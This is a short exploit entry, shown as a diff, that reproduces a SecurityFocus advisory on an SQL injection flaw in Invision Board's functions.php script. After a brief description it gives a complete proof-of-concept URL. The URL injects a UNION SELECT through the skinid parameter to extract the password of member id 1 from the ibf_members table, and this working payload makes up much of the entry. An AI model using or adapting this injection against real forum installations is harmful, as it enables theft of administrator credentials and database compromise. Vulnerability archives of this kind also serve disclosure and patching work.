@@ -1,0 +1,8 @@
+source: http://www.securityfocus.com/bid/7290/info
+
+An input validation error has been reported in Invision Board which may result in the manipulation of SQL queries. This vulnerability exists in the functions.php script file.
+
+An attacker may be able to exploit this vulnerability by manipulating some URI parameter to include malicious SQL commands and queries which may result in information disclosure, or database corruption. 
+
+http://www.example.com/index.php?skinid=99+AND+s.hidden%3D0+UNION+SELECT+s.*%2C+t.template%2C+c.password+FROM+ibf_skins+s+LEFT+JOIN+ibf_templates+t+ON+%28t.tmid%3Ds.tmpl_id%
+29+LEFT+JOIN+ibf_members+c+ON+%28c.id%3D1%29+WHERE+s.sid%3D1+AND+s.hidden%3D0 
